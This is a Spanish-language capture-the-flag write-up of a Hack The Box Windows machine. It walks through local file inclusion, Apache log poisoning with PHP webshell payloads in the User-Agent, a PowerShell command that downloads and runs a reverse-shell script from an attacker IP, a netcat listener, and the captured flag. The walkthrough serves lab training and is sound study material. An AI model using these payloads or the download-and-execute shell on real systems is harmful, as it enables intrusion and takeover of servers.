## Información general

- **Dificultad**: Very Easy
- **Sistema operativo**: Windows
- **Vector principal**: LFI (Local File Inclusion) -> RCE vía Log Poisoning

## Reconocimiento inicial

Escaneo completo de puertos con nmap:

```
sudo nmap -sC -sV -p- 10.129.172.105
```

Resultado:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Puntos relevantes de este escaneo:

- Apache corriendo sobre Windows (indicado por "Win64" en el banner) sugiere una instalación XAMPP, ya que no es habitual encontrar Apache nativo en Windows fuera de ese tipo de paquetes.
- El puerto 5985 confirma WinRM, típico de máquinas Windows, aunque no se ha usado en esta ruta de explotación ya que no hicieron falta credenciales para ganar acceso.

## Enumeración web

Al visitar `http://10.129.172.105` con el navegador, la petición redirige automáticamente hacia el nombre de dominio `unika.htb`, por lo que fue necesario añadirlo al `/etc/hosts`:

```
sudo sh -c 'echo "10.129.172.105 unika.htb" >> /etc/hosts'
```

Revisando el código fuente de la página principal se encontró un selector de idioma que revela el funcionamiento interno de la aplicación:

```html
<a href="/index.php?page=french.html">FR</a>
<a href="/index.php?page=german.html">DE</a>
```

El parámetro `page` recibido por GET, usado presumiblemente dentro de una función `include()` de PHP para cargar el contenido de la página, es un patrón clásico de vulnerabilidad **LFI (Local File Inclusion)**.

## Explotación: LFI

### Confirmación del LFI

Primer intento de path traversal hacia un archivo de prueba (`win.ini`), usado como PoC estándar en Windows por ser un archivo legible sin privilegios especiales:

```
GET /index.php?page=../../../../../../windows/win.ini HTTP/1.1
Host: unika.htb
```

El sistema devolvió el contenido del archivo, confirmando el LFI.

### Lectura del código fuente de la aplicación

Usando el wrapper `php://filter` para leer `index.php` como texto plano en base64 (evitando que PHP lo ejecute):

```
GET /index.php?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
Host: unika.htb
```

Decodificando la respuesta se obtuvo el código fuente completo:

```php
<?php 
$domain = "unika.htb";
if($_SERVER['SERVER_NAME'] != $domain) {
  echo '<meta http-equiv="refresh" content="0;url=http://unika.htb/">';
  die();
}
if(!isset($_GET['page'])) {
  include("./english.html");
}
else {
  include($_GET['page']);
}
```

Esto confirma que el parámetro `page` se pasa directamente a `include()` sin ningún tipo de sanitización, whitelist o blacklist. También confirmó la ruta de instalación: `C:\xampp\htdocs\`, visible en los mensajes de error de PHP.

## Escalada de LFI a RCE: Log Poisoning

### Teoría

Apache registra cada petición HTTP recibida en `access.log`, incluyendo cabeceras como el `User-Agent`, sin validar ni sanear su contenido. Si se inyecta código PHP en esa cabecera, dicho código queda escrito tal cual en el log. Como `include()` no distingue entre archivos "pensados" para ser incluidos y cualquier archivo de texto del sistema, al incluir el propio log, PHP interpreta y ejecuta cualquier bloque `<?php ?>` que encuentre dentro.

Ruta del log en esta instalación: `C:\xampp\apache\logs\access.log`

### Primer intento fallido: ruta incorrecta

```
GET /index.php?page=../../../../../xampp/logs/acces.log HTTP/1.1
```

**Errores cometidos**: faltaba el directorio `apache` en la ruta, y el nombre del archivo estaba mal escrito (`acces.log` en vez de `access.log`). Corregido a:

```
GET /index.php?page=../../../../../xampp/apache/logs/access.log HTTP/1.1
```

Con esto se confirmó lectura correcta del log.

### Segundo intento fallido: log corrompido por sintaxis inválida

Se inyectó el siguiente payload en el `User-Agent` mediante Caido:

```
<?php system($_GET['cmd']); ?>
```

Al intentar incluir el log para ejecutar `whoami`, se recibió:

```
Parse error: Unclosed '[' does not match ')' in access.log on line 2128
```

**Causa del error**: el payload se inyectó de forma incompleta (faltaba cerrar un corchete `]`). Como PHP necesita compilar el archivo completo antes de ejecutar cualquier parte de él, un único error de sintaxis en cualquier punto del archivo impide la ejecución de todo el contenido, incluyendo líneas correctas posteriores.

**Problema adicional**: al ser una máquina de tipo "Free" de HTB (compartida entre varios usuarios simultáneos), el log ya contenía entradas de otros usuarios intentando el mismo ataque, lo que también generaba ruido y posibles conflictos de parseo.

**Solución**: no fue posible corregir el log ya escrito (es de solo apéndice, no se puede editar ni borrar líneas previas desde el LFI), por lo que fue necesario **resetear la máquina** desde el panel de HTB para partir de un `access.log` limpio.

### Tercer intento fallido: comillas dobles escapadas por Apache

Tras el reinicio, se probó un webshell más elaborado:

```php
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

Resultado:

```
Parse error: syntax error, unexpected token "\", expecting "]" in access.log on line 1970
```

**Causa del error**: Apache escapa automáticamente las comillas dobles al escribirlas dentro de un campo del log que ya va delimitado por comillas dobles (como el `User-Agent`), convirtiendo cada `"` en `\"`. Esto rompe la sintaxis PHP al quedar `\` sueltas donde el intérprete espera otro token.

**Solución**: reescribir el payload usando comillas simples en vez de dobles, ya que en PHP son equivalentes para strings simples y no son escapadas por Apache al no entrar en conflicto con el delimitador del campo del log:

```php
<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>
```

Fue necesario resetear la máquina de nuevo antes de reinyectar, ya que el log seguía corrompido por el intento anterior.

### RCE confirmado

Tras el reinicio y la reinyección con comillas simples, la petición:

```
GET /index.php?page=../../../../../xampp/apache/logs/access.log&cmd=whoami HTTP/1.1
Host: unika.htb
```

Devolvió:

```
responder\administrator
```

Confirmando ejecución remota de comandos con privilegios de administrador local, ya que el proceso de Apache corre bajo esa cuenta.

## Obtención de shell interactiva

Para pasar de ejecución de comandos sueltos a una sesión interactiva se usó una reverse shell en PowerShell (generada en revshells.com), servida mediante un servidor HTTP propio para evitar problemas de escaping al inyectar el script completo en la URL.

**Pasos:**

1. Guardar el payload de PowerShell en `rev.ps1`.
2. Servir el archivo desde la máquina atacante:
    
    ```
    python3 -m http.server 8000
    ```
    
3. Levantar listener en la máquina atacante:
    
    ```
    nc -lvnp 4444
    ```
    
4. Mediante el webshell obtenido por log poisoning, ejecutar:
    
    ```
    powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.242:8000/rev.ps1')"
    ```
    
    (URL-encodeado antes de enviarlo como valor del parámetro `cmd`)

Al recibir la conexión en el listener de netcat se obtuvo una shell interactiva como `responder\administrator`.

## Post-explotación

Con la shell interactiva se enumeraron los usuarios del sistema:

```
dir C:\Users
Administrator  mike  Public
```

Se localizó la flag en el escritorio del usuario `mike`:

```
C:\Users\mike\Desktop\flag.txt
```


**Flag obtenida**: `ea81b7afddd03efaa0945333ed147fac`

## Resumen de la cadena de explotación

1. Enumeración de puertos con nmap: HTTP (80) y WinRM (5985).
2. Descubrimiento de un parámetro `page` vulnerable a LFI en `index.php`.
3. Confirmación del LFI leyendo `win.ini` y el propio código fuente vía `php://filter`.
4. Escalada a RCE mediante log poisoning: inyección de código PHP en el `User-Agent`, e inclusión posterior de `access.log` a través del LFI.
5. Obtención de shell interactiva mediante descarga y ejecución de un script de reverse shell en PowerShell.
6. Enumeración post-explotación y obtención de la flag en el perfil del usuario `mike`.
